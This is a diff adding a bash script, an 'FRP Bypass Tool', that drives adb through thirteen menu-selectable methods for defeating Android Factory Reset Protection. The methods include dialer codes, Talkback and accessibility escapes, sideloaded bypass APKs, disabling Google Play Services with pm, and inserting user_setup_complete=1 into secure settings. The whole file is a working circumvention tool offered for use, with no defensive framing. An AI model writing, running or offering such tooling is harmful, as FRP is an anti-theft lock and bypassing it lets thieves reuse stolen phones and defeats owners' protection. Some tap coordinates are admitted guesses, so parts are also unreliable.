@@ -1,0 +1,603 @@
+#!/bin/bash
+
+# FRP Bypass Tool for Linux - At your own risk 
+# Requirements: android-tools-adb
+
+# Colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
+
+# Log file
+LOG_FILE="frp_bypass.log"
+
+# Log function
+log() {
+  echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
+}
+
+# Clean up ADB server on script termination
+trap 'adb kill-server &>/dev/null; echo -e "${RED}Script terminated. ADB server stopped.${NC}"; log "Script terminated."; exit 1' SIGINT SIGTERM
+
+# Check device connection with retry logic
+check_device_connection() {
+  local retries=3
+  local attempt=1
+  while [ $attempt -le $retries ]; do
+    adb start-server &>/dev/null || { echo -e "${RED}ADB server failed to start (attempt $attempt/$retries).${NC}"; log "ADB start failed."; return 1; }
+    if adb devices | grep -q "device$"; then
+      log "Device connected."
+      return 0
+    fi
+    echo -e "${RED}No device connected (attempt $attempt/$retries). Checking again...${NC}"
+    adb kill-server &>/dev/null
+    sleep 2
+    ((attempt++))
+  done
+  echo -e "${RED}No device connected after $retries attempts. Please reconnect using the connection menu.${NC}"
+  log "Connection failed after retries."
+  return 1
+}
+
+# Ensure android-tools is installed
+install_android_tools() {
+  echo -e "${GREEN}Checking for android-tools...${NC}"
+  if command -v adb &>/dev/null; then
+    echo -e "${GREEN}android-tools is already installed.${NC}"
+    log "android-tools installed."
+    return
+  fi
+  if [ -f /etc/debian_version ]; then
+    echo -e "${GREEN}Debian/Ubuntu detected. Installing...${NC}"
+    sudo apt update || { echo -e "${RED}Failed to update package lists.${NC}"; log "APT update failed."; exit 1; }
+    sudo apt install -y android-tools-adb || { echo -e "${RED}Failed to install android-tools.${NC}"; log "Install failed."; exit 1; }
+  elif [ -f /etc/arch-release ]; then
+    echo -e "${GREEN}Arch Linux detected. Installing...${NC}"
+    sudo pacman -Sy --noconfirm android-tools || { echo -e "${RED}Failed to install android-tools.${NC}"; log "Install failed."; exit 1; }
+  else
+    echo -e "${RED}Unsupported system. Please install android-tools manually.${NC}"
+    log "Unsupported system."
+    exit 1
+  fi
+  if ! command -v adb &>/dev/null; then
+    echo -e "${RED}Failed to install android-tools. Please install manually.${NC}"
+    log "Install verification failed."
+    exit 1
+  fi
+  log "android-tools installed successfully."
+}
+
+# ADB USB connection
+connect_usb() {
+  adb kill-server
+  adb start-server || { echo -e "${RED}Failed to start ADB server. Check permissions or port conflicts.${NC}"; log "ADB server start failed."; exit 1; }
+  echo -e "${GREEN}Looking for USB devices...${NC}"
+  for i in {1..3}; do
+    adb devices
+    if adb devices | grep -q "unauthorized"; then
+      echo -e "${RED}Device unauthorized. Please accept the ADB connection on your device (attempt $i/3).${NC}"
+      sleep 5
+      adb kill-server
+      adb start-server || { echo -e "${RED}Failed to start ADB server. Check permissions or port conflicts.${NC}"; log "ADB restart failed."; exit 1; }
+    elif adb devices | grep -q "device$"; then
+      echo -e "${GREEN}Connected via USB.${NC}"
+      log "USB connection successful."
+      return 0
+    else
+      echo -e "${RED}No device found via USB (attempt $i/3).${NC}"
+      sleep 5
+      adb kill-server
+      adb start-server || { echo -e "${RED}Failed to start ADB server. Check permissions or port conflicts.${NC}"; log "ADB restart failed."; exit 1; }
+    fi
+  done
+  echo -e "${RED}Failed to connect via USB after 3 attempts.${NC}"
+  log "USB connection failed."
+  return 1
+}
+
+# Device Compatibility Check (Updated for Android 15)
+check_device_compatibility() {
+  check_device_connection || return 1
+  echo -e "${GREEN}Checking device compatibility...${NC}"
+  local brand=$(adb shell getprop ro.product.brand 2>/dev/null | tr -d '\r' | xargs)
+  local release=$(adb shell getprop ro.build.version.release 2>/dev/null | tr -d '\r' | xargs)
+  local android_version=$(echo "$release" | cut -d'.' -f1)
+
+  echo -e "${GREEN}Device Brand: ${brand:-Unknown}${NC}"
+  echo -e "${GREEN}Android Version: ${release:-Unknown}${NC}"
+  echo -e "${YELLOW}Recommended bypass methods:${NC}"
+  if [[ "$android_version" =~ ^[5-9]$ ]]; then
+    echo -e "${YELLOW}- Dial Menu Exploit (Android 5.x-9.x)${NC}"
+    echo -e "${YELLOW}- APK Bypass (All versions)${NC}"
+    [[ "$android_version" =~ ^[8-9]$ ]] && echo -e "${YELLOW}- SIM Card Exploit (Android 8-10)${NC}"
+    [[ "$android_version" =~ ^[7-9]$ ]] && echo -e "${YELLOW}- Quick Shortcut Maker Method (Android 7-11)${NC}"
+  elif [[ "$android_version" =~ ^1[0-1]$ ]]; then
+    echo -e "${YELLOW}- Talkback Exploit (Android 10-12)${NC}"
+    echo -e "${YELLOW}- APK Bypass (All versions)${NC}"
+    echo -e "${YELLOW}- Quick Shortcut Maker Method (Android 7-11)${NC}"
+    echo -e "${YELLOW}- Direct ADB Bypass (Android 10-13)${NC}"
+    [[ "$brand" =~ [Ss][Aa][Mm][Ss][Uu][Nn][Gg] ]] && echo -e "${YELLOW}- Alliance Shield X Method (Samsung, Android 11-14)${NC}"
+  elif [[ "$android_version" =~ ^1[2-5]$ ]]; then
+    echo -e "${YELLOW}- YouTube/Maps Exploit (Android 13-14)${NC}"
+    echo -e "${YELLOW}- Emergency Call Glitch (Android 12-14)${NC}"
+    echo -e "${YELLOW}- Accessibility Menu Exploit (Android 12-14)${NC}"
+    echo -e "${YELLOW}- APK Bypass (All versions)${NC}"
+    [[ "$brand" =~ [Ss][Aa][Mm][Ss][Uu][Nn][Gg] ]] && echo -e "${YELLOW}- Alliance Shield X Method (Samsung, Android 11-14)${NC}"
+    [[ "$brand" =~ [Mm][Oo][Tt][Oo][Rr][Oo][Ll][Aa] ]] && echo -e "${YELLOW}- Motorola Accessibility Bypass (Android 14)${NC}"
+  else
+    echo -e "${YELLOW}- APK Bypass (All versions)${NC}"
+  fi
+  echo
+  read -r -p "Press Enter to continue..."
+  log "Compatibility check run for $brand Android $release."
+}
+
+# Device Info Report (Slimmed down: Brand, Model, Android, Serial)
+show_device_report() {
+  check_device_connection || return 1
+  clear
+  echo -e "\n${GREEN}=== Device Info ===${NC}"
+  echo
+
+  # Basic Device Info
+  echo -e "${GREEN}Device Info${NC}"
+  local brand=$(adb shell getprop ro.product.brand 2>/dev/null | tr -d '\r' | xargs)
+  local model=$(adb shell getprop ro.product.model 2>/dev/null | tr -d '\r' | xargs)
+  local release=$(adb shell getprop ro.build.version.release 2>/dev/null | tr -d '\r' | xargs)
+  local serial=$(adb shell getprop ro.serialno 2>/dev/null | tr -d '\r' | xargs)
+
+  echo "  Brand:     ${brand:-Unknown}"
+  echo "  Model:     ${model:-Unknown}"
+  echo "  Android:   ${release:-Unknown}"
+  echo "  Serial:    ${serial:-Unknown}"
+  echo
+
+  read -r -p "Press Enter to return..."
+  log "Device report viewed."
+}
+
+# Dial Menu Exploit (Android 5.x-9.x)
+dial_menu_exploit() {
+  check_device_connection || return 1
+  echo -e "${GREEN}Attempting Dial Menu Exploit (Android 5.x-9.x)...${NC}"
+  log "Starting Dial Menu Exploit."
+  echo -e "${YELLOW}Instructions: Follow on-screen prompts on the device. This exploit may require manual interaction.${NC}"
+
+  # Step 1: Open dialer and input emergency code
+  echo -e "${GREEN}Opening dialer with emergency code...${NC}"
+  adb shell input keyevent 3 # Home button
+  sleep 1
+  adb shell input text "*#*#4636#*#*" || { echo -e "${RED}Failed to open dialer menu.${NC}"; log "Dialer open failed."; return 1; }
+  sleep 3
+
+  # Step 2: Attempt to access settings via the menu
+  echo -e "${GREEN}Attempting to navigate to settings...${NC}"
+  adb shell input keyevent 66 # Enter key
+  sleep 1
+  adb shell input tap 500 1000 # Tap approximate location for Settings (adjust based on device)
+  sleep 2
+
+  # Step 3: Navigate to Google Account settings
+  echo -e "${GREEN}Navigating to Google Account settings...${NC}"
+  for i in {1..5}; do
+    adb shell input keyevent 20 # Down key
+    sleep 0.5
+  done
+  adb shell input keyevent 66 # Enter key
+  sleep 2
+
+  # Step 4: Attempt to add or remove Google account
+  echo -e "${GREEN}Attempting to access account management...${NC}"
+  adb shell input tap 500 500 # Tap approximate location for Add Account
+  sleep 2
+  adb shell input text "bypass@gmail.com" # Dummy input for account
+  sleep 1
+  adb shell input keyevent 66 # Enter key
+  sleep 2
+
+  echo -e "${YELLOW}Please check the device screen and follow any prompts to add/remove the Google account.${NC}"
+  echo -e "${GREEN}If successful, FRP should be bypassed after account setup. Rebooting device...${NC}"
+  adb reboot || { echo -e "${RED}Failed to reboot device.${NC}"; log "Reboot failed."; return 1; }
+  echo -e "${GREEN}Device rebooted. Check if FRP is bypassed after restart.${NC}"
+  log "Dial Menu Exploit completed."
+  read -r -p "Press Enter to continue..."
+}
+
+# Talkback Exploit (Android 10-12)
+talkback_exploit() {
+  check_device_connection || return 1
+  echo -e "${GREEN}Attempting Talkback Exploit (Android 10-12)...${NC}"
+  log "Starting Talkback Exploit."
+  echo -e "${YELLOW}Manual steps required: This will guide you to enable Talkback and access settings. ADB will assist with inputs where possible.${NC}"
+  echo -e "${YELLOW}On device: During setup, connect to Wi-Fi, then hold Vol Up + Vol Down to enable Talkback.${NC}"
+  read -r -p "Press Enter once Talkback is enabled..."
+
+  # Automate some navigation with ADB
+  echo -e "${GREEN}Drawing 'L' gesture and accessing Talkback settings...${NC}"
+  adb shell input swipe 100 500 500 500 500 # Approximate L swipe (adjust if needed)
+  sleep 2
+  adb shell input tap 500 800 # Tap Talkback Settings
+  sleep 2
+
+  echo -e "${YELLOW}On device: In Talkback settings, double-tap 'Help & Feedback', search for 'YouTube', open it.${NC}"
+  echo -e "${YELLOW}From YouTube: Tap share icon, select 'More', then 'Chrome' to open browser. Search 'Settings' and navigate to Accounts to add/remove Google account.${NC}"
+  read -r -p "Press Enter once in settings..."
+
+  # ADB to help add account
+  adb shell input tap 500 600 # Tap Add Account (approx)
+  sleep 2
+  adb shell input text "bypass@gmail.com"
+  adb shell input keyevent 66
+  sleep 2
+
+  echo -e "${GREEN}Complete account addition on device. Rebooting...${NC}"
+  adb reboot || { echo -e "${RED}Failed to reboot.${NC}"; log "Reboot failed."; return 1; }
+  echo -e "${GREEN}Check if FRP is bypassed post-reboot.${NC}"
+  log "Talkback Exploit completed."
+  read -r -p "Press Enter to continue..."
+}
+
+# YouTube/Maps Exploit (Android 13-14)
+youtube_maps_exploit() {
+  check_device_connection || return 1
+  echo -e "${GREEN}Attempting YouTube/Maps Exploit (Android 13-14)...${NC}"
+  log "Starting YouTube/Maps Exploit."
+  echo -e "${YELLOW}Manual steps: On setup screen, tap 'Emergency Call', dial *#*#4636#*#* if possible, or use voice command 'Open YouTube'.${NC}"
+  read -r -p "Press Enter once in YouTube..."
+
+  # ADB navigation assist with retry
+  local retry=0
+  while [ $retry -lt 2 ]; do
+    echo -e "${GREEN}Navigating to Maps via YouTube...${NC}"
+    adb shell input tap 800 100 # Tap search (approx)
+    sleep 1
+    adb shell input text "maps"
+    adb shell input keyevent 66
+    sleep 3
+    adb shell input tap 500 500 # Open Maps
+    sleep 2
+    if adb shell dumpsys activity | grep -q "Maps"; then
+      break
+    fi
+    echo -e "${YELLOW}Navigation failed, retrying...${NC}"
+    ((retry++))
+  done
+
+  echo -e "${YELLOW}In Maps: Search 'Settings', navigate to Accounts & Sign-in, add new Google account or remove old one.${NC}"
+  read -r -p "Press Enter once in accounts..."
+
+  adb shell input tap 500 700 # Tap Add Account
+  sleep 2
+  adb shell input text "bypass@gmail.com"
+  adb shell input keyevent 66
+  sleep 2
+
+  echo -e "${GREEN}Finish on device. Rebooting...${NC}"
+  adb reboot || { echo -e "${RED}Failed to reboot.${NC}"; log "Reboot failed."; return 1; }
+  echo -e "${GREEN}Verify FRP bypass after restart.${NC}"
+  log "YouTube/Maps Exploit completed."
+  read -r -p "Press Enter to continue..."
+}
+
+# APK Bypass (All versions)
+apk_bypass() {
+  check_device_connection || return 1
+  echo -e "${GREEN}Attempting APK Bypass (All versions)...${NC}"
+  log "Starting APK Bypass."
+  echo -e "${YELLOW}Need an FRP bypass APK (e.g., Easy Flashing 8.0 or vnROM). Download it from a trusted source and provide path.${NC}"
+  read -r -p "Enter full path to APK: " apk_path
+  if [ ! -f "$apk_path" ] || [[ ! "$apk_path" =~ \.apk$ ]]; then
+    echo -e "${RED}Invalid or missing APK at $apk_path. Must be a valid .apk file.${NC}"
+    log "Invalid APK path."
+    return 1
+  fi
+
+  # Install APK via ADB
+  echo -e "${GREEN}Sideloading APK...${NC}"
+  adb install "$apk_path" || { echo -e "${RED}Install failed. Check if ADB debugging is enabled or APK is valid.${NC}"; log "APK install failed."; return 1; }
+  sleep 2
+
+  # Launch APK (assume it auto-runs or manual)
+  echo -e "${YELLOW}On device: Open the installed APK and follow its FRP bypass prompts (may auto-remove Google lock).${NC}"
+  adb shell monkey -p $(adb shell pm list packages | grep -oP '(?<=package:)\S+' | head -1) -c android.intent.category.LAUNCHER 1 || { echo -e "${RED}Failed to launch APK.${NC}"; log "APK launch failed."; return 1; }
+  sleep 5
+
+  echo -e "${GREEN}Rebooting device...${NC}"
+  adb reboot || { echo -e "${RED}Failed to reboot.${NC}"; log "Reboot failed."; return 1; }
+  echo -e "${GREEN}Check if FRP is gone post-reboot.${NC}"
+  log "APK Bypass completed."
+  read -r -p "Press Enter to continue..."
+}
+
+# SIM Card Exploit (Android 8-10)
+sim_card_exploit() {
+  check_device_connection || return 1
+  echo -e "${GREEN}Attempting SIM Card Exploit (Android 8-10)...${NC}"
+  log "Starting SIM Card Exploit."
+  echo -e "${YELLOW}Requirements: A SIM card with a PIN lock enabled. Manual steps required on device.${NC}"
+  echo -e "${YELLOW}On device: Insert PIN-locked SIM, power on, and enter wrong PIN 3 times to trigger SIM lock screen. Then tap 'Unlock via Google'.${NC}"
+  read -r -p "Press Enter once on SIM lock screen..."
+
+  # ADB assist for navigation
+  echo -e "${GREEN}Attempting to navigate to settings via SIM lock...${NC}"
+  adb shell input tap 500 800 # Tap 'Unlock via Google' (approx)
+  sleep 2
+  adb shell input text "settings"
+  adb shell input keyevent 66 # Enter key
+  sleep 2
+
+  echo -e "${YELLOW}On device: In Settings, navigate to Accounts, add a new Google account, or remove the old one.${NC}"
+  read -r -p "Press Enter once in Accounts..."
+
+  adb shell input tap 500 600 # Tap Add Account (approx)
+  sleep 2
+  adb shell input text "bypass@gmail.com"
+  adb shell input keyevent 66
+  sleep 2
+
+  echo -e "${GREEN}Complete account setup on device. Rebooting...${NC}"
+  adb reboot || { echo -e "${RED}Failed to reboot.${NC}"; log "Reboot failed."; return 1; }
+  echo -e "${GREEN}Check if FRP is bypassed post-reboot.${NC}"
+  log "SIM Card Exploit completed."
+  read -r -p "Press Enter to continue..."
+}
+
+# Alliance Shield X Method (Samsung, Android 11-14)
+alliance_shield_x_method() {
+  check_device_connection || return 1
+  echo -e "${GREEN}Attempting Alliance Shield X Method (Samsung, Android 11-14)...${NC}"
+  log "Starting Alliance Shield X Method."
+  echo -e "${YELLOW}Requirements: Download Alliance Shield X APK (from a trusted source). Install via USB/OTG or ADB. USB debugging must be enabled.${NC}"
+  read -r -p "Enter full path to Alliance Shield X APK: " apk_path
+  if [ ! -f "$apk_path" ] || [[ ! "$apk_path" =~ \.apk$ ]]; then
+    echo -e "${RED}Invalid or missing APK at $apk_path. Must be a valid .apk file.${NC}"
+    log "Invalid APK path."
+    return 1
+  fi
+
+  # Install APK via ADB
+  echo -e "${GREEN}Sideloading Alliance Shield X APK...${NC}"
+  adb install "$apk_path" || { echo -e "${RED}Install failed. Check if ADB debugging is enabled or APK is valid.${NC}"; log "APK install failed."; return 1; }
+  sleep 2
+
+  # Launch Alliance Shield X
+  echo -e "${GREEN}Launching Alliance Shield X...${NC}"
+  adb shell monkey -p com.rrs.alliance_shield_x -c android.intent.category.LAUNCHER 1 || { echo -e "${RED}Failed to launch Alliance Shield X.${NC}"; log "Launch failed."; return 1; }
+  sleep 5
+
+  echo -e "${YELLOW}On device: In Alliance Shield X, enable 'Device Admin', then use 'App Manager' to disable 'Google Play Services' and 'Google Account Manager'. Add new Google account via Settings > Accounts.${NC}"
+  read -r -p "Press Enter once Google Play Services is disabled..."
+
+  # ADB to assist account addition
+  adb shell input tap 500 600 # Tap Add Account (approx)
+  sleep 2
+  adb shell input text "bypass@gmail.com"
+  adb shell input keyevent 66
+  sleep 2
+
+  echo -e "${GREEN}Finish account setup on device. Rebooting...${NC}"
+  adb reboot || { echo -e "${RED}Failed to reboot.${NC}"; log "Reboot failed."; return 1; }
+  echo -e "${GREEN}Verify FRP bypass after restart. Re-enable Google Play Services if needed.${NC}"
+  log "Alliance Shield X Method completed."
+  read -r -p "Press Enter to continue..."
+}
+
+# Emergency Call Glitch (Android 12-14)
+emergency_call_glitch() {
+  check_device_connection || return 1
+  echo -e "${GREEN}Attempting Emergency Call Glitch (Android 12-14)...${NC}"
+  log "Starting Emergency Call Glitch."
+  echo -e "${YELLOW}Manual steps: On setup screen, tap 'Emergency Call', dial *#0*#. If that fails, try rapid taps on 'Emergency Information' (2-3 times).${NC}"
+  read -r -p "Press Enter once in Emergency Information or test menu..."
+
+  # ADB assist for navigation
+  echo -e "${GREEN}Attempting to access Settings...${NC}"
+  adb shell input tap 500 800 # Tap Emergency Information or test menu option (approx)
+  sleep 2
+  adb shell input text "settings"
+  adb shell input keyevent 66
+  sleep 2
+
+  echo -e "${YELLOW}On device: In Settings, navigate to Accounts, add a new Google account, or remove the old one.${NC}"
+  read -r -p "Press Enter once in Accounts..."
+
+  adb shell input tap 500 600 # Tap Add Account (approx)
+  sleep 2
+  adb shell input text "bypass@gmail.com"
+  adb shell input keyevent 66
+  sleep 2
+
+  echo -e "${GREEN}Complete account setup on device. Rebooting...${NC}"
+  adb reboot || { echo -e "${RED}Failed to reboot.${NC}"; log "Reboot failed."; return 1; }
+  echo -e "${GREEN}Check if FRP is bypassed post-reboot.${NC}"
+  log "Emergency Call Glitch completed."
+  read -r -p "Press Enter to continue..."
+}
+
+# Quick Shortcut Maker Method (Android 7-11)
+quick_shortcut_maker_method() {
+  check_device_connection || return 1
+  echo -e "${GREEN}Attempting Quick Shortcut Maker Method (Android 7-11)...${NC}"
+  log "Starting Quick Shortcut Maker Method."
+  echo -e "${YELLOW}Requirements: Download Quick Shortcut Maker APK (from a trusted source). Install via USB/OTG or ADB. USB debugging must be enabled.${NC}"
+  read -r -p "Enter full path to Quick Shortcut Maker APK: " apk_path
+  if [ ! -f "$apk_path" ] || [[ ! "$apk_path" =~ \.apk$ ]]; then
+    echo -e "${RED}Invalid or missing APK at $apk_path. Must be a valid .apk file.${NC}"
+    log "Invalid APK path."
+    return 1
+  fi
+
+  # Install APK via ADB
+  echo -e "${GREEN}Sideloading Quick Shortcut Maker APK...${NC}"
+  adb install "$apk_path" || { echo -e "${RED}Install failed. Check if ADB debugging is enabled or APK is valid.${NC}"; log "APK install failed."; return 1; }
+  sleep 2
+
+  # Launch Quick Shortcut Maker
+  echo -e "${GREEN}Launching Quick Shortcut Maker...${NC}"
+  adb shell monkey -p jp.co.c_lis.ccl.shortcut -c android.intent.category.LAUNCHER 1 || { echo -e "${RED}Failed to launch Quick Shortcut Maker.${NC}"; log "Launch failed."; return 1; }
+  sleep 5
+
+  echo -e "${YELLOW}On device: In Quick Shortcut Maker, search for 'Google Account Manager' or 'Settings'. Select an activity with 'com.google.android.gsf.login' or 'com.android.settings'. Launch it and add/remove Google account.${NC}"
+  read -r -p "Press Enter once in Google Account Manager or Settings..."
+
+  # ADB to assist account addition
+  adb shell input tap 500 600 # Tap Add Account (approx)
+  sleep 2
+  adb shell input text "bypass@gmail.com"
+  adb shell input keyevent 66
+  sleep 2
+
+  echo -e "${GREEN}Finish account setup on device. Rebooting...${NC}"
+  adb reboot || { echo -e "${RED}Failed to reboot.${NC}"; log "Reboot failed."; return 1; }
+  echo -e "${GREEN}Verify FRP bypass after restart.${NC}"
+  log "Quick Shortcut Maker Method completed."
+  read -r -p "Press Enter to continue..."
+}
+
+# Accessibility Menu Exploit (Android 12-14)
+accessibility_menu_exploit() {
+  check_device_connection || return 1
+  echo -e "${GREEN}Attempting Accessibility Menu Exploit (Android 12-14)...${NC}"
+  log "Starting Accessibility Menu Exploit."
+  echo -e "${YELLOW}Manual steps: On setup screen, tap 'Accessibility' (bottom right), enable Accessibility Menu. Use voice command 'Open Google' or tap Accessibility button to open browser.${NC}"
+  read -r -p "Press Enter once Accessibility Menu is enabled..."
+
+  # ADB assist for navigation
+  echo -e "${GREEN}Attempting to open browser via Accessibility Menu...${NC}"
+  adb shell input tap 800 100 # Tap search or browser (approx)
+  sleep 2
+  adb shell input text "settings"
+  adb shell input keyevent 66
+  sleep 2
+
+  echo -e "${YELLOW}On device: In browser, search 'Settings', navigate to Accounts & Sign-in, add new Google account or remove old one.${NC}"
+  read -r -p "Press Enter once in Accounts..."
+
+  adb shell input tap 500 600 # Tap Add Account (approx)
+  sleep 2
+  adb shell input text "bypass@gmail.com"
+  adb shell input keyevent 66
+  sleep 2
+
+  echo -e "${GREEN}Finish account setup on device. Rebooting...${NC}"
+  adb reboot || { echo -e "${RED}Failed to reboot.${NC}"; log "Reboot failed."; return 1; }
+  echo -e "${GREEN}Verify FRP bypass after restart.${NC}"
+  log "Accessibility Menu Exploit completed."
+  read -r -p "Press Enter to continue..."
+}
+
+# Direct ADB Bypass (Android 10-13, some 14)
+direct_adb_bypass() {
+  check_device_connection || return 1
+  echo -e "${GREEN}Attempting Direct ADB Bypass (Android 10-13, some 14)...${NC}"
+  log "Starting Direct ADB Bypass."
+  echo -e "${YELLOW}This method requires ADB access during setup (may need pre-enabled debugging). For Samsung or others.${NC}"
+
+  local brand=$(adb shell getprop ro.product.brand 2>/dev/null | tr -d '\r' | xargs)
+  if [[ "$brand" =~ [Ss][Aa][Mm][Ss][Uu][Nn][Gg] ]]; then
+    echo -e "${GREEN}Samsung detected. Running Samsung-specific commands...${NC}"
+    adb shell am start -n com.google.android.gsf.login/ || { echo -e "${RED}Command failed.${NC}"; log "Samsung command 1 failed."; }
+    adb shell am start -n com.google.android.gsf.login.LoginActivity || { echo -e "${RED}Command failed.${NC}"; log "Samsung command 2 failed."; }
+  fi
+  echo -e "${GREEN}Setting user setup complete...${NC}"
+  adb shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1 || { echo -e "${RED}Insert failed. May not work on this device.${NC}"; log "Setup complete insert failed."; return 1; }
+
+  echo -e "${GREEN}Commands executed. Rebooting device...${NC}"
+  adb reboot || { echo -e "${RED}Failed to reboot.${NC}"; log "Reboot failed."; return 1; }
+  echo -e "${GREEN}Check if FRP is bypassed post-reboot. If not, try another method.${NC}"
+  log "Direct ADB Bypass completed."
+  read -r -p "Press Enter to continue..."
+}
+
+# Motorola Accessibility Bypass (Android 14, Moto devices)
+motorola_accessibility_bypass() {
+  check_device_connection || return 1
+  echo -e "${GREEN}Attempting Motorola Accessibility Bypass (Android 14, Moto devices)...${NC}"
+  log "Starting Motorola Accessibility Bypass."
+  echo -e "${YELLOW}Manual steps heavy: Follow closely. ADB will assist with taps. For Moto G55 and similar.${NC}"
+  echo -e "${YELLOW}On device: Turn on, connect WiFi, back to 'Hello' screen. Enter random text on Verify screen for 2-3 mins, tap Next to Privacy & Update. Tap Motorola Privacy Policy > About > website privacy statement > support.motorola.com.${NC}"
+  read -r -p "Press Enter once on Motorola support site..."
+
+  echo -e "${YELLOW}Tap Sign in > Sign in with Motorola Account. Long-press email box > Share > Message > New Message. Send 'www.youtube.com' to random number, tap preview to load YouTube.${NC}"
+  read -r -p "Press Enter once in YouTube..."
+
+  # ADB assist to open terms and settings
+  echo -e "${GREEN}ADB assisting: Tapping Account > About > Terms...${NC}"
+  adb shell input tap 900 100 # Approx Account icon
+  sleep 2
+  adb shell input tap 500 800 # Approx About
+  sleep 2
+  adb shell input tap 500 900 # Approx Terms
+  sleep 2
+
+  echo -e "${YELLOW}Tap Accessibility > Toggle Accessibility player > Hide controls > Settings gear > Device Settings > Enable Accessibility menu.${NC}"
+  read -r -p "Press Enter once Accessibility menu enabled..."
+
+  # ADB to disable services
+  echo -e "${GREEN}Disabling Google services via ADB...${NC}"
+  adb shell pm disable-user --user 0 com.google.android.gms || { echo -e "${RED}Disable failed.${NC}"; log "GMS disable failed."; }
+  adb shell pm disable-user --user 0 com.google.android.gsf || { echo -e "${RED}Disable failed.${NC}"; log "GSF disable failed."; }
+
+  echo -e "${YELLOW}Use shortcut: Tap 3 dots > Assistant > Allow. Search 'Moto Secure' > Open Apps > Disable/Force stop Android Auto, Setup, Google Play Services.${NC}"
+  read -r -p "Press Enter once services disabled..."
+
+  echo -e "${YELLOW}Open sidebar (Gesture > Sidebar > On), remove apps, add Back to Home/Switch app. Go to WiFi screen > Setup offline > Continue to finish setup.${NC}"
+  echo -e "${GREEN}Re-enabling services and rebooting...${NC}"
+  adb shell pm enable com.google.android.gms
+  adb shell pm enable com.google.android.gsf
+  adb reboot || { echo -e "${RED}Failed to reboot.${NC}"; log "Reboot failed."; return 1; }
+  echo -e "${GREEN}Verify FRP bypass after restart.${NC}"
+  log "Motorola Accessibility Bypass completed."
+  read -r -p "Press Enter to continue..."
+}
+
+# FRP Bypass Menu
+frp_bypass_menu() {
+  clear
+  while true; do
+    echo -e "\n${GREEN}=== FRP Bypass Menu ===${NC}"
+    echo "1) Show Device Info"
+    echo "2) Check Device Compatibility"
+    echo "3) Dial Menu Exploit (Android 5.x-9.x)"
+    echo "4) Talkback Exploit (Android 10-12)"
+    echo "5) YouTube/Maps Exploit (Android 13-14)"
+    echo "6) APK Bypass (All versions, requires APK)"
+    echo "7) SIM Card Exploit (Android 8-10)"
+    echo "8) Alliance Shield X Method (Samsung, Android 11-14)"
+    echo "9) Emergency Call Glitch (Android 12-14)"
+    echo "10) Quick Shortcut Maker Method (Android 7-11)"
+    echo "11) Accessibility Menu Exploit (Android 12-14)"
+    echo "12) Direct ADB Bypass (Android 10-13, some 14)"
+    echo "13) Motorola Accessibility Bypass (Android 14, Moto devices)"
+    echo "14) Exit"
+    read -r -p "Choose (1-14): " c
+    case $c in
+      1) show_device_report ;;
+      2) check_device_compatibility ;;
+      3) dial_menu_exploit ;;
+      4) talkback_exploit ;;
+      5) youtube_maps_exploit ;;
+      6) apk_bypass ;;
+      7) sim_card_exploit ;;
+      8) alliance_shield_x_method ;;
+      9) emergency_call_glitch ;;
+      10) quick_shortcut_maker_method ;;
+      11) accessibility_menu_exploit ;;
+      12) direct_adb_bypass ;;
+      13) motorola_accessibility_bypass ;;
+      14) echo -e "${GREEN}Catch you later, Boss!${NC}"; log "Script exited."; exit 0 ;;
+      *) echo -e "${RED}Invalid choice.${NC}" ;;
+    esac
+  done
+}
+
+# Script start
+echo -e "${GREEN}=================================${NC}"
+echo -e "${GREEN}         FRP Bypass Tool         ${NC}"
+echo -e "${GREEN}=================================${NC}"
+echo -e "${NC}"
+log "Script started."
+install_android_tools
+connect_usb || { echo -e "${RED}Connection failed. Can't proceed without a device.${NC}"; log "Initial connection failed."; exit 1; }
+frp_bypass_menu
